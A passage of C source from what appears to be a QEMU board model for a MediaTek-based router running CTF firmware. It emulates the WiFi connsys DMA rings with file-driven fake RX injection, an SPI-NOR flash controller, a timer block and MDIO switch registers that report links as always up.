                                      rx_payload, rx_payload_len);
    leopard_connsys_fill_fake_rx_slot(0x4410, connsys.fake_rx_next_slot,
                                      rx_payload, rx_payload_len);
    if (duplicate_rx) {
        uint32_t next_slot = connsys.fake_rx_next_slot + 1;

        if (rx0_max && next_slot >= rx0_max) {
            next_slot = 0;
        }
        leopard_connsys_fill_fake_rx_slot(0x4400, next_slot, rx_payload,
                                          rx_payload_len);
        leopard_connsys_fill_fake_rx_slot(0x4410, next_slot, rx_payload,
                                          rx_payload_len);
        connsys.fake_rx_next_slot = next_slot + 1;
    } else {
        connsys.fake_rx_next_slot++;
    }
    if (ring_off == 0x4330 && new_idx == 1 && rx0_max) {
        leopard_connsys_fill_fake_rx_slot(0x4400, rx0_max - 1, rx_payload,
                                          rx_payload_len);
    }
    if (ring_off == 0x4330 && new_idx == 1 && rx1_max) {
        leopard_connsys_fill_fake_rx_slot(0x4410, rx1_max - 1, rx_payload,
                                          rx_payload_len);
    }

    /*
     * 0x400000 selects the combined TX/RX service path, and the low bits tell
     * that service there is RX/TX work pending.  Using only a low RX bit lets
     * the IRQ handler record pending work but does not naturally run the
     * consumer before the first patch command times out.
     */
    leopard_connsys_raise_fake_rx_status(status);
    if (rx_payload != ev) {
        g_free(rx_payload);
    }
}

static void leopard_connsys_fill_rx_file_at_wait(void)
{
    const char *env = getenv("LEOPARD_WIFI_FAKE_RX_FILE_AT_WAIT");
    const char *path = getenv("LEOPARD_WIFI_FAKE_RX_FILE");
    const char *list = getenv("LEOPARD_WIFI_FAKE_RX_FILE_LIST");
    const char *rings_env = getenv("LEOPARD_WIFI_FAKE_RX_FILE_RINGS");
    const char *count_env = getenv("LEOPARD_WIFI_FAKE_RX_FILE_COUNT");
    const char *from_reg_env = getenv("LEOPARD_WIFI_FAKE_RX_FILE_FROM_REG");
    bool fill_rx0 = true;
    bool fill_rx1 = true;
    gchar *contents = NULL;
    gsize contents_len = 0;
    GError *err = NULL;
    uint32_t rx0_max;
    uint32_t rx1_max;
    uint32_t rx0_ring_size;
    uint32_t rx1_ring_size;
    uint32_t rx0_start = 0;
    uint32_t rx1_start = 0;
    uint32_t fill_count = 0;

    if (!env || !*env || ((!path || !*path) && (!list || !*list))) {
        return;
    }
    if (rings_env && *rings_env) {
        fill_rx0 = g_strstr_len(rings_env, -1, "rx0") ||
                   g_strstr_len(rings_env, -1, "both");
        fill_rx1 = g_strstr_len(rings_env, -1, "rx1") ||
                   g_strstr_len(rings_env, -1, "both");
    }
    rx0_max = leopard_connsys_reg_readback(0x4404);
    rx1_max = leopard_connsys_reg_readback(0x4414);
    rx0_ring_size = rx0_max;
    rx1_ring_size = rx1_max;
    if (from_reg_env && *from_reg_env) {
        if (rx0_ring_size) {
            rx0_start = leopard_connsys_reg_readback(0x4408) % rx0_ring_size;
        }
        if (rx1_ring_size) {
            rx1_start = leopard_connsys_reg_readback(0x4418) % rx1_ring_size;
        }
    }
    if (count_env && *count_env) {
        fill_count = g_ascii_strtoull(count_env, NULL, 0);
        if (fill_count > 0) {
            rx0_max = MIN(rx0_max, fill_count);
            rx1_max = MIN(rx1_max, fill_count);
        }
    }
    if (list && *list) {
        gchar **paths = g_strsplit(list, ",", -1);
        GPtrArray *payloads = g_ptr_array_new_with_free_func(g_free);
        GArray *lengths = g_array_new(FALSE, FALSE, sizeof(gsize));

        for (guint i = 0; paths && paths[i]; i++) {
            gchar *entry = g_strstrip(paths[i]);
            gchar *item = NULL;
            gsize item_len = 0;

            if (!*entry) {
                continue;
            }
            if (!g_file_get_contents(entry, &item, &item_len, &err)) {
                if (getenv("LEOPARD_WIFI_MCU_TRACE")) {
                    fprintf(stderr,
                            "[wifi-mcu] fake-rx-file-list read failed "
                            "path=%s err=%s\n",
                            entry, err ? err->message : "unknown");
                }
                g_clear_error(&err);
                continue;
            }
            if (item_len == 0 || item_len > 0x3fff) {
                if (getenv("LEOPARD_WIFI_MCU_TRACE")) {
                    fprintf(stderr,
                            "[wifi-mcu] fake-rx-file-list rejected path=%s "
                            "len=%zu\n",
                            entry, (size_t)item_len);
                }
                g_free(item);
                continue;
            }
            g_ptr_array_add(payloads, item);
            g_array_append_val(lengths, item_len);
        }
        if (payloads->len) {
            for (uint32_t i = 0; fill_rx0 && i < rx0_max; i++) {
                guint idx = i % payloads->len;
                gsize item_len = g_array_index(lengths, gsize, idx);
                leopard_connsys_fill_fake_rx_slot(0x4400,
                                                  (rx0_start + i) % rx0_ring_size,
                                                  payloads->pdata[idx],
                                                  item_len);
            }
            for (uint32_t i = 0; fill_rx1 && i < rx1_max; i++) {
                guint idx = i % payloads->len;
                gsize item_len = g_array_index(lengths, gsize, idx);
                leopard_connsys_fill_fake_rx_slot(0x4410,
                                                  (rx1_start + i) % rx1_ring_size,
                                                  payloads->pdata[idx],
                                                  item_len);
            }
            leopard_connsys_raise_fake_rx_status(0x400003);
            if (getenv("LEOPARD_WIFI_MCU_TRACE")) {
                fprintf(stderr,
                        "[wifi-mcu] fake-rx-file-list-at-wait count=%u "
                        "rx0=%u rx1=%u rx0_start=%u rx1_start=%u rings=%s\n",
                        payloads->len, fill_rx0 ? rx0_max : 0,
                        fill_rx1 ? rx1_max : 0, rx0_start, rx1_start,
                        rings_env && *rings_env ? rings_env : "both");
            }
        }
        g_ptr_array_free(payloads, TRUE);
        g_array_free(lengths, TRUE);
        g_strfreev(paths);
        return;
    }
    if (!g_file_get_contents(path, &contents, &contents_len, &err)) {
        if (getenv("LEOPARD_WIFI_MCU_TRACE")) {
            fprintf(stderr,
                    "[wifi-mcu] fake-rx-file-at-wait read failed path=%s "
                    "err=%s\n",
                    path, err ? err->message : "unknown");
        }
        g_clear_error(&err);
        return;
    }
    if (contents_len == 0 || contents_len > 0x3fff) {
        if (getenv("LEOPARD_WIFI_MCU_TRACE")) {
            fprintf(stderr,
                    "[wifi-mcu] fake-rx-file-at-wait rejected path=%s "
                    "len=%zu\n",
                    path, (size_t)contents_len);
        }
        g_free(contents);
        return;
    }

    for (uint32_t i = 0; fill_rx0 && i < rx0_max; i++) {
        leopard_connsys_fill_fake_rx_slot(0x4400,
                                          (rx0_start + i) % rx0_ring_size,
                                          (uint8_t *)contents, contents_len);
    }
    for (uint32_t i = 0; fill_rx1 && i < rx1_max; i++) {
        leopard_connsys_fill_fake_rx_slot(0x4410,
                                          (rx1_start + i) % rx1_ring_size,
                                          (uint8_t *)contents, contents_len);
    }
    leopard_connsys_raise_fake_rx_status(0x400003);
    if (getenv("LEOPARD_WIFI_MCU_TRACE")) {
        fprintf(stderr,
                "[wifi-mcu] fake-rx-file-at-wait path=%s len=%zu "
                "rx0=%u rx1=%u rx0_start=%u rx1_start=%u rings=%s\n",
                path, (size_t)contents_len, fill_rx0 ? rx0_max : 0,
                fill_rx1 ? rx1_max : 0, rx0_start, rx1_start,
                rings_env && *rings_env ? rings_env : "both");
    }
    g_free(contents);
}

static void leopard_connsys_maybe_force_rx_consumer(uint32_t ring_off,
                                                    uint32_t new_idx)
{
    const char *env = getenv("LEOPARD_WIFI_FORCE_RX_CONSUMER");
    const char *adapter_env;
    CPUState *cs;
    ARMCPU *acpu;
    uint32_t adapter = 0x416d5784;
    static bool forced;

    if (!env || !*env || forced || ring_off != 0x4330 || new_idx != 1) {
        return;
    }

    adapter_env = getenv("LEOPARD_WIFI_ADAPTER");
    if (adapter_env && *adapter_env) {
        adapter = (uint32_t)strtoul(adapter_env, NULL, 0);
    }

    cs = qemu_get_cpu(0);
    acpu = cs ? ARM_CPU(cs) : NULL;
    if (!acpu) {
        return;
    }

    forced = true;
    if (getenv("LEOPARD_WIFI_MCU_TRACE")) {
        fprintf(stderr,
                "[wifi-mcu] force-rx-consumer adapter=%#x pc=%#x lr=%#x\n",
                adapter, acpu->env.regs[15], acpu->env.regs[14]);
    }

    acpu->env.regs[0] = adapter;
    acpu->env.regs[14] = acpu->env.regs[15];
    acpu->env.regs[15] = 0x402f0c2c;
}

static void leopard_connsys_update_irq(void)
{
    if (connsys.irq) {
        qemu_set_irq(connsys.irq,
                     (connsys.int_status & connsys.int_mask) ? 1 : 0);
    }
}

static uint64_t leopard_connsys_read(void *opaque, hwaddr off, unsigned size)
{
    uint32_t o = off & ~3u;
    LeopardConnsysReg *r = leopard_connsys_find(o, false);
    const LeopardConnsysFixedReg *fixed = leopard_connsys_fixed_reg(o);
    uint32_t val = r ? r->val : 0;

    if (fixed) {
        val = fixed->val;
    } else if (o == 0x000c1140) { /* MCU firmware sync stage */
        val = (connsys.fw_sync_stage ? connsys.fw_sync_stage : 1) << 1;
    } else if (o == 0x00004200) { /* WPDMA interrupt status */
        val = connsys.int_status;
    } else if (o == 0x00004204) { /* WPDMA interrupt mask */
        val = connsys.int_mask;
    }

    if (getenv("LEOPARD_CONNSYS_LOG")) {
        leopard_log_access(LEOPARD_CONNSYS_BASE + off, false, val, size);
    }
    leopard_connsys_ring_trace(o, false, val, size);
    return val;
}

static void leopard_connsys_write(void *opaque, hwaddr off, uint64_t val,
                                  unsigned size)
{
    uint32_t o = off & ~3u;
    LeopardConnsysReg *r = leopard_connsys_find(o, true);

    if (o == 0x00004200) {
        connsys.int_status &= ~(uint32_t)val; /* W1C */
        leopard_connsys_update_irq();
        leopard_connsys_ring_trace(o, true, val, size);
        if (getenv("LEOPARD_CONNSYS_LOG")) {
            leopard_log_access(LEOPARD_CONNSYS_BASE + off, true, val, size);
        }
        return;
    }
    if (o == 0x00004204) {
        connsys.int_mask = (uint32_t)val;
        leopard_connsys_update_irq();
        leopard_connsys_ring_trace(o, true, val, size);
        if (getenv("LEOPARD_CONNSYS_LOG")) {
            leopard_log_access(LEOPARD_CONNSYS_BASE + off, true, val, size);
        }
        return;
    }
    if (r) {
        r->val = (uint32_t)val;
    }
    if (leopard_connsys_is_tx_cpu_idx(o)) {
        const LeopardConnsysRingInfo *ring =
            leopard_connsys_ring_by_cpu_idx(o);
        uint32_t ring_off = ring->base_off;

        leopard_connsys_trace_mcu_tx(ring_off, (uint32_t)val);
        leopard_connsys_maybe_fake_rx_event(ring_off, (uint32_t)val);
        leopard_connsys_maybe_force_rx_consumer(ring_off, (uint32_t)val);
        leopard_connsys_maybe_mcu_event_bit(ring_off, (uint32_t)val);
        leopard_connsys_kick_tx_ring(ring_off, (uint32_t)val);
        leopard_connsys_maybe_tx_done(ring_off);
    } else if (leopard_connsys_is_rx_cpu_idx(o)) {
        /*
         * RX CPU_IDX writes are firmware-owned descriptor returns.  They are
         * not TX submissions; treating them as TX kicks can re-enter the HIF
         * register path with a bogus TX context and mask packet-path faults.
         */
        leopard_connsys_update_irq();
    }
    if (getenv("LEOPARD_CONNSYS_LOG")) {
        leopard_log_access(LEOPARD_CONNSYS_BASE + off, true, val, size);
    }
    leopard_connsys_ring_trace(o, true, val, size);
}

static const MemoryRegionOps leopard_connsys_ops = {
    .read = leopard_connsys_read,
    .write = leopard_connsys_write,
    .endianness = DEVICE_NATIVE_ENDIAN,
    .valid = {
        .min_access_size = 1,
        .max_access_size = 4,
    },
};

/* MTK SPI-NOR controller at 0x11014000 (MT76xx-style legacy mtk-nor).
 *
 *   +0x00 CMDR   write 0x04 = PRG cycle (PRGDATA out + SHREG in)
 *                write 0x81 = PIO READ (single byte from RDATA per cycle)
 *                read       = 0 when done
 *   +0x04 CNT    bit count for the PRG cycle (8 bits per byte)
 *   +0x08 RDSR   status; 0 = idle
 *   +0x0c RDATA  byte returned by PIO_READ
 *   +0x10 RADR0  address byte 0 used by PIO_READ
 *   +0x14 RADR1  address byte 1
 *   +0x18 RADR2  address byte 2
 *   +0x1c WDATA  byte for PIO write
 *   +0x20 PRGDATA0  first byte sent (= flash opcode)
 *   +0x24 PRGDATA1  next byte (addr[23:16] for 0x03)
 *   +0x28 PRGDATA2  addr[15:8]
 *   +0x2c PRGDATA3  addr[7:0]
 *   +0x30 PRGDATA4
 *   +0x34 PRGDATA5
 *   +0x38 SHREG0  first byte shifted in (oldest)
 *   +0x3c SHREG1
 *   +0x40 SHREG2  ... last (matches real hardware bit ordering)
 *
 * Backing storage: ctf-firmware.bin loaded via -drive if=mtd,file=...
 * (or via the LEOPARD_FLASH_FILE env var fallback). On JEDEC READ ID
 * (0x9F) we always answer with W25Q128BV (EF 40 18); other commands
 * use the backing file.
 */
#define NOR_BASE  0x11014000
#define NOR_SIZE  0x1000

static struct {
    uint8_t  prg[6];     /* PRGDATA0..5 */
    uint8_t  shreg[3];   /* SHREG0..2   */
    uint32_t cnt;
    uint8_t  radr[3];
    uint8_t  rdata;
    uint8_t  *flash;     /* mmap'd ctf-firmware.bin */
    size_t   flash_size;
    uint32_t sf_dma_cmd;
    uint32_t sf_dma_flash_src;
    uint32_t sf_dma_dst;
    uint32_t sf_dma_end;
    uint32_t sf_dma_last_flash_src;
    uint32_t sf_dma_last_dst;
    uint32_t sf_dma_last_end;
    bool     sf_dma_copied;
} nor;

static void nor_load_flash(void)
{
    const char *path = getenv("LEOPARD_FLASH_FILE");
    if (!path) {
        path = "/Users/phulin/Documents/Projects/router/ctf-firmware.bin";
    }
    FILE *f = fopen(path, "rb");
    if (!f) {
        fprintf(stderr, "[leopard] no flash backing %s\n", path);
        return;
    }
    fseek(f, 0, SEEK_END);
    nor.flash_size = ftell(f);
    fseek(f, 0, SEEK_SET);
    nor.flash = g_malloc(nor.flash_size);
    if (fread(nor.flash, 1, nor.flash_size, f) != nor.flash_size) {
        fprintf(stderr, "[leopard] flash read short\n");
    }
    fclose(f);
    fprintf(stderr, "[leopard] flash loaded: %s (%zu bytes)\n", path,
            nor.flash_size);
}

/* Run the PRG cycle currently programmed via PRGDATA0..5 + CNT.
 * Register layout: byte at the *highest* offset is shifted out first.
 *   PRGDATA5 (+0x34) = first byte = opcode
 *   PRGDATA4 (+0x30) = next byte (address MSB for 0x03)
 *   ...
 * Same for SHREG: SHREG2 (+0x40) = first byte received.
 */
static void nor_do_prg(void)
{
    uint8_t op = nor.prg[5];
    uint32_t total = nor.cnt / 8;
    memset(nor.shreg, 0, sizeof(nor.shreg));
    switch (op) {
    case 0x9f: /* READ JEDEC ID: 1 cmd + 3 ID bytes (mfg, type, cap) */
        nor.shreg[2] = 0xef; /* first byte received: manufacturer */
        nor.shreg[1] = 0x40;
        nor.shreg[0] = 0x18;
        break;
    case 0xab: /* RES — return electronic ID */
        nor.shreg[2] = 0x17;
        break;
    case 0x05: /* RDSR-1: not busy */
    case 0x35: /* RDSR-2 */
    case 0x15: /* RDSR-3 */
        nor.shreg[2] = 0;
        break;
    case 0x06: /* WREN */
    case 0x04: /* WRDI */
        break;
    case 0x03: /* READ DATA: 1 op + 3 addr + N data, N <= 3 in PRG mode */
        if (nor.flash && total >= 4) {
            uint32_t addr = ((uint32_t)nor.prg[4] << 16) |
                            ((uint32_t)nor.prg[3] << 8)  |
                            (uint32_t)nor.prg[2];
            uint32_t n = total - 4;
            if (n > 3) n = 3;
            for (uint32_t i = 0; i < n; i++) {
                uint8_t b = (addr + i < nor.flash_size) ?
                            nor.flash[addr + i] : 0xff;
                nor.shreg[2 - i] = b;
            }
        }
        break;
    default:
        break;
    }
}

/* Run a PIO_READ cycle — return one byte from flash[radr] at RDATA. */
static void nor_do_pio_read(void)
{
    uint32_t addr = (nor.radr[2] << 16) | (nor.radr[1] << 8) | nor.radr[0];
    nor.rdata = (nor.flash && addr < nor.flash_size) ?
                nor.flash[addr] : 0xff;
}

static void nor_try_sf_dma(void)
{
    uint32_t len;

    if (!nor.flash || !nor.sf_dma_dst || nor.sf_dma_end <= nor.sf_dma_dst) {
        return;
    }

    len = nor.sf_dma_end - nor.sf_dma_dst;
    if (len > MiB || nor.sf_dma_flash_src > nor.flash_size ||
        len > nor.flash_size - nor.sf_dma_flash_src) {
        return;
    }

    if (nor.sf_dma_copied &&
        nor.sf_dma_last_flash_src == nor.sf_dma_flash_src &&
        nor.sf_dma_last_dst == nor.sf_dma_dst &&
        nor.sf_dma_last_end == nor.sf_dma_end) {
        return;
    }

    address_space_write(&address_space_memory, nor.sf_dma_dst,
                        MEMTXATTRS_UNSPECIFIED,
                        nor.flash + nor.sf_dma_flash_src, len);
    nor.sf_dma_last_flash_src = nor.sf_dma_flash_src;
    nor.sf_dma_last_dst = nor.sf_dma_dst;
    nor.sf_dma_last_end = nor.sf_dma_end;
    nor.sf_dma_copied = true;
    fprintf(stderr,
            "[nor] sf-dma copy flash=%#x -> dram=%#x len=%#x cmd=%#x\n",
            nor.sf_dma_flash_src, nor.sf_dma_dst, len, nor.sf_dma_cmd);
}

static uint64_t leopard_unmap_read(void *opaque, hwaddr off, unsigned size)
{
    hwaddr abs = NOR_BASE + off;
    uint64_t v = 0;
    {
        switch (off) {
        case 0x00: v = 0; break;            /* CMDR: cycle complete */
        case 0x08: v = 0; break;            /* RDSR: idle           */
        case 0x0c: v = nor.rdata; break;    /* RDATA                */
        case 0x38: v = nor.shreg[0]; break;
        case 0x3c: v = nor.shreg[1]; break;
        case 0x40: v = nor.shreg[2]; break;
        case 0x718:
            /* Serial-flash DMA status: complete immediately after copying. */
            nor_try_sf_dma();
            v = 0;
            break;
        default:   v = 0;
        }
    }
    leopard_log_access(abs, false, v, size);
    return v;
}
static void leopard_unmap_write(void *opaque, hwaddr off,
                                uint64_t val, unsigned size)
{
    hwaddr abs = NOR_BASE + off;
    {
        switch (off) {
        case 0x00: /* CMDR */
            if (val == 0x04) nor_do_prg();
            else if (val == 0x81) nor_do_pio_read();
            break;
        case 0x04: nor.cnt = val; break;
        case 0x10: nor.radr[0] = val; break;
        case 0x14: nor.radr[1] = val; break;
        case 0x18: nor.radr[2] = val; break;
        case 0x20: nor.prg[0] = val; break;
        case 0x24: nor.prg[1] = val; break;
        case 0x28: nor.prg[2] = val; break;
        case 0x2c: nor.prg[3] = val; break;
        case 0x30: nor.prg[4] = val; break;
        case 0x34: nor.prg[5] = val; break;
        case 0x718:
            nor.sf_dma_cmd = val;
            nor.sf_dma_copied = false;
            nor_try_sf_dma();
            break;
        case 0x71c:
            nor.sf_dma_flash_src = val;
            nor.sf_dma_copied = false;
            nor_try_sf_dma();
            break;
        case 0x720:
            nor.sf_dma_dst = val;
            nor.sf_dma_copied = false;
            nor_try_sf_dma();
            break;
        case 0x724:
            nor.sf_dma_end = val;
            nor.sf_dma_copied = false;
            nor_try_sf_dma();
            break;
        }
    }
    leopard_log_access(abs, true, val, size);
}
static const MemoryRegionOps leopard_unmap_ops = {
    .read = leopard_unmap_read,
    .write = leopard_unmap_write,
    .endianness = DEVICE_NATIVE_ENDIAN,
    .valid.min_access_size = 1,
    .valid.max_access_size = 4,
};

/* --- MTK General-Purpose Timer at 0x10004000 ----------------------------
 * 6 channels, stride 0x10, channel N base = 0x10004010 + N*0x10:
 *   +0x00 CON       bit0 = enable, bit1 = periodic mode
 *   +0x04 COMPARE   match value (period); units = timer clock ticks
 *   +0x0C CNT       current count
 *   +0x1C PRESCALE  clock-source / prescaler (channel 5 only)
 * Global registers at 0x10004000:
 *   +0x00 IRQ_EN    bit N = enable IRQ from channel N
 *   +0x04 IRQ_STA   bit N = pending
 *   +0x08 IRQ_ACK   write 1<<N to clear channel N pending
 * All channels OR'd to one IRQ line (GIC SPI 152). The RTOS uses channel
 * 5 for the OS tick; U-Boot pre-RTOS reads a µs free-running counter
 * which we synthesise at offset 0x48 (= channel 3 +0x08) regardless of
 * channel-3 CON state, since U-Boot doesn't program the channel.
 *
 * Timer-period model: we treat COMPARE as microseconds (clock = 1 MHz),
 * with a 1 ms floor so we never schedule absurdly fast and starve TCG.
 * If CON enables a channel without a non-zero COMPARE, we default to
 * 1 ms — enough to advance the RTOS tick into Ethernet bring-up.
 */
#define LEOPARD_GPT_NCHAN  6
#define LEOPARD_GPT_IRQ    152   /* GIC SPI; INTID = 32 + 152 = 184 (0xB8) */
#define LEOPARD_WIFI_IRQ   211   /* firmware registers vector 0xf3 = SPI 211 */

typedef struct {
    uint32_t con;
    uint32_t compare;
    uint32_t cnt;
    uint32_t prescale;
    int      idx;
    QEMUTimer *timer;
    int64_t  start_ns;
} LeopardGptChan;

static struct {
    uint32_t irq_en;
    uint32_t irq_sta;
    qemu_irq irq;
    LeopardGptChan ch[LEOPARD_GPT_NCHAN];
} gpt;

static void gpt_update_irq(void)
{
    qemu_set_irq(gpt.irq, (gpt.irq_sta & gpt.irq_en) ? 1 : 0);
}

static int64_t gpt_period_ns(LeopardGptChan *c)
{
    int64_t us = c->compare ? c->compare : 1000;
    if (us < 1000) us = 1000;          /* 1 ms floor */
    return us * 1000;                  /* ns */
}

static void gpt_chan_cb(void *opaque)
{
    LeopardGptChan *c = opaque;
    gpt.irq_sta |= (1u << c->idx);
    gpt_update_irq();
    if (c->con & 2) {                  /* periodic mode */
        c->start_ns = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL);
        timer_mod(c->timer, c->start_ns + gpt_period_ns(c));
    }
}

static void gpt_chan_rearm(LeopardGptChan *c)
{
    if (c->con & 3) {                  /* enable bit OR mode bit */
        c->start_ns = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL);
        timer_mod(c->timer, c->start_ns + gpt_period_ns(c));
    } else {
        timer_del(c->timer);
    }
}

static uint64_t leopard_timer_read(void *opaque, hwaddr off, unsigned size)
{
    /* Preserve U-Boot's expectation: free-running µs counter at +0x48. */
    if (off == 0x48) {
        return qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL) / 1000;
    }
    /* Global regs */
    if (off < 0x10) {
        switch (off) {
        case 0x00: return gpt.irq_en;
        case 0x04: return gpt.irq_sta;
        case 0x08: return 0;
        }
        return 0;
    }
    /* Per-channel */
    if (off >= 0x10 && off < 0x10 + LEOPARD_GPT_NCHAN * 0x10) {
        unsigned ch = (off - 0x10) >> 4;
        unsigned reg = off & 0xf;
        LeopardGptChan *c = &gpt.ch[ch];
        switch (reg) {
        case 0x0: return c->con;
        case 0x4: return c->compare;
        case 0xc: {
            /* synthesise current count from elapsed time at 1 MHz */
            if (!(c->con & 1)) return c->cnt;
            int64_t dt = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL) - c->start_ns;
            return (uint32_t)(dt / 1000);
        }
        }
        return 0;
    }
    return 0;
}

static void leopard_timer_write(void *opaque, hwaddr off,
                                uint64_t val, unsigned size)
{
    if (off < 0x10) {
        switch (off) {
        case 0x00:
            gpt.irq_en = val;
            gpt_update_irq();
            return;
        case 0x04:
            gpt.irq_sta = val;
            gpt_update_irq();
            return;
        case 0x08:
            gpt.irq_sta &= ~(uint32_t)val;
            gpt_update_irq();
            return;
        }
        return;
    }
    if (off >= 0x10 && off < 0x10 + LEOPARD_GPT_NCHAN * 0x10) {
        unsigned ch = (off - 0x10) >> 4;
        unsigned reg = off & 0xf;
        LeopardGptChan *c = &gpt.ch[ch];
        switch (reg) {
        case 0x0: {
            uint32_t old = c->con;
            c->con = val;
            if ((old & 3) != (val & 3)) {
                gpt_chan_rearm(c);
            }
            return;
        }
        case 0x4: c->compare = val; return;
        case 0xc: c->cnt = val; return;
        }
        if (reg == 0xc) c->cnt = val;
        if (off == (0x10 + ch * 0x10) + 0x1c) c->prescale = val;
    }
}

static const MemoryRegionOps leopard_timer_ops = {
    .read = leopard_timer_read,
    .write = leopard_timer_write,
    .endianness = DEVICE_NATIVE_ENDIAN,
    .valid.min_access_size = 1,
    .valid.max_access_size = 4,
};

/* MTK GSW MDIO controller (PHY_IAC) — single 32-bit register at
 * 0x1B110000 + 0x04. Layout (clause-22):
 *   bit31     START/BUSY  (sw=1 to start; hw clears on completion)
 *   bits29:25 PHY address
 *   bits24:20 Register address
 *   bits19:18 OP (01=write, 10=read c22, 11=c45 addr, 01-after=c45 read)
 *   bits15:0  DATA
 *
 * We synthesize a fake "always link-up, 1000-FD, autoneg complete"
 * gigabit PHY on every PHY address the firmware probes.  This gets the
 * MTK switch driver past PHY-detect and into FE-RX-ring init so packets
 * actually land in firmware buffers.
 *
 * Logging goes to a separate file (LEOPARD_MDIO_LOG env or
 * /tmp/leopard_mdio.log) so we can study which addresses / regs are
 * probed without flooding the main device log. */
#define MDIO_BASE      0x1B110000
#define MDIO_REG       0x04

/* The firmware drives the MT-style indirect register access protocol on
 * top of MDIO: PHY addresses 21/23/24/25/31 with reg 29 act as latched
 * command channels into a 32-bit-addressable switch register file,
 * rather than as ordinary PHY clause-22 reads.  Channels (empirically):
 *   phy=31 reg=29  -> latch indirect "page" (high 16 bits of address)
 *   phy=23 reg=29  -> latch indirect "addr" (low 16 bits of address)
 *   phy=24 reg=29  -> latch indirect write data (low 16 bits)
 *   phy=21 reg=29  -> command trigger
 *                       0x0001 = read (page,addr) into result latch
 *                       0x0003 = write (latched data) to (page,addr)
 *   phy=25 reg=29  -> read latched result
 *
 * We back this with a sparse 32-bit register file (sw_reg) so reads
 * return whatever was previously written.  For "fresh" reads we synth-
 * esize plausible MT7531 values: chip-ID-like high word, link-up port
 * status, etc.  Standard clause-22 PHY accesses on PHY addrs 0..4
 * (the per-port internal PHYs) still work via phy_reg[]. */
#define SW_REG_MAX 4096
static struct {
    uint32_t cmd;
    uint16_t last_data;
    int      log_n;
    FILE    *log_f;
    /* Per-PHY scratch for register writes the driver might read back. */
    uint16_t phy_reg[32][32];   /* [addr][reg] */
    int      phy_init;
    /* Indirect-access state */
    uint16_t ind_page, ind_addr, ind_wdata;
    uint16_t ind_result;
    /* Sparse switch register file: linear search small table. */
    struct { uint32_t key; uint16_t val; uint8_t used; } sw_reg[SW_REG_MAX];
    int sw_reg_n;
    /* AR8337-style MDIO window, addressed as 32-bit switch registers split
     * across MDIO addrs 0x10..0x17 and adjacent low/high halfword regs. */
    struct { uint16_t key; uint32_t val; uint8_t used; } ar_reg[SW_REG_MAX];
    int ar_reg_n;
} mdio;

static uint16_t *sw_reg_slot(uint32_t key, int create)
{
    for (int i = 0; i < mdio.sw_reg_n; i++) {
        if (mdio.sw_reg[i].used && mdio.sw_reg[i].key == key) {
            return &mdio.sw_reg[i].val;
        }
    }
    if (!create || mdio.sw_reg_n >= SW_REG_MAX) return NULL;
    mdio.sw_reg[mdio.sw_reg_n].key = key;
    mdio.sw_reg[mdio.sw_reg_n].val = 0;
    mdio.sw_reg[mdio.sw_reg_n].used = 1;
    return &mdio.sw_reg[mdio.sw_reg_n++].val;
}

/* Synthesize a plausible MT7531-class read value for an unwritten
 * 16-bit-wide indirect register at (page,addr).  These are the values
 * the firmware needs to see early in switch bring-up:
 *   page=0xe, addr=0x1300/0x1301 : GPHY alive marker (must be non-zero)
 *   page=0,   addr=0x781C        : MT7531 chip ID low half  (CREV)
 *   page=0,   addr=0x781E        : MT7531 chip ID high half (= 0x7531)
 *   page=0,   addr=0x3008+P*0x100: PMSR_Pn — port-N MAC status, link
 *                                  up / 1Gb / FD on every port
 *   default                      : 0x0000
 */
static uint16_t sw_reg_default(uint32_t key)
{
    uint16_t page = key >> 16;
    uint16_t addr = key & 0xffff;
    if (page == 0xe) {
        /* MTK GePHY top-block ID (from firmware MOVW probes — see
         *  0x4023ee40, 0x40356150, 0x403a846c, etc. in decompressed.bin
         *  where 0x03A2 is hardcoded). Try high-first ordering. */
        if (addr == 0x1300) return 0x03a2;   /* high half of GePHY ID */
        if (addr == 0x1301) return 0x29c2;   /* low  half of GePHY ID */
    }
    if (page == 0) {
        if (addr == 0x781c) return 0x0000;     /* chip rev, low half */
        if (addr == 0x781e) return 0x7531;     /* chip name, high half */
        /* PMSR_Pn at 0x3008 | (P<<8). Bits: link(0), duplex(1), speed[5:4]=10 */
        if ((addr & 0xf8ff) == 0x3008) return 0x0033;
    }
    return 0x0000;
}

static uint32_t *ar_reg_slot(uint16_t key, int create)
{
    for (int i = 0; i < mdio.ar_reg_n; i++) {
        if (mdio.ar_reg[i].used && mdio.ar_reg[i].key == key) {
            return &mdio.ar_reg[i].val;
        }
    }
    if (!create || mdio.ar_reg_n >= SW_REG_MAX) return NULL;
    mdio.ar_reg[mdio.ar_reg_n].key = key;
    mdio.ar_reg[mdio.ar_reg_n].val = 0;
    mdio.ar_reg[mdio.ar_reg_n].used = 1;
    return &mdio.ar_reg[mdio.ar_reg_n++].val;
}

typedef struct LeopardAr8337RegDefault {
    uint16_t reg;
    uint32_t val;
    uint32_t force_set;
    uint32_t force_clear;
    const char *name;
} LeopardAr8337RegDefault;

static const LeopardAr8337RegDefault leopard_ar8337_defaults[] = {
    /*
     * Register 0 is the AR8xxx mask/revision register.  The C7 driver checks
     * bits 15:8 for 0x13 and polls bit 31 clear after reset.
     */
    { 0x0000, 0x00001302, 0,          0x80000000, "MASK_CTRL" },
    /*
     * The driver reads switch register 0x20 and waits for reset-complete bits
     * 29:24 to become all ones.
     */
    { 0x0010, 0x3f000000, 0x3f000000, 0,          "GLOBAL_INT_STATUS" },
    /* AR8337_REG_PORT_STATUS(n), byte register 0x7c + n * 4. */
    { 0x003e, 0x0000007f, 0x0000007f, 0,          "PORT0_STATUS" },
    { 0x0040, 0x0000007f, 0x0000007f, 0,          "PORT1_STATUS" },
    { 0x0042, 0x0000007f, 0x0000007f, 0,          "PORT2_STATUS" },
    { 0x0044, 0x0000007f, 0x0000007f, 0,          "PORT3_STATUS" },
    { 0x0046, 0x0000007f, 0x0000007f, 0,          "PORT4_STATUS" },
    { 0x0048, 0x0000007f, 0x0000007f, 0,          "PORT5_STATUS" },
    { 0x004a, 0x0000007f, 0x0000007f, 0,          "PORT6_STATUS" },
};

static const LeopardAr8337RegDefault *
leopard_ar8337_default_by_reg(uint16_t key)
{
    for (int i = 0; i < ARRAY_SIZE(leopard_ar8337_defaults); i++) {
        if (leopard_ar8337_defaults[i].reg == key) {
            return &leopard_ar8337_defaults[i];
        }
    }
    return NULL;
}

static uint32_t ar_reg_default(uint16_t key)
{
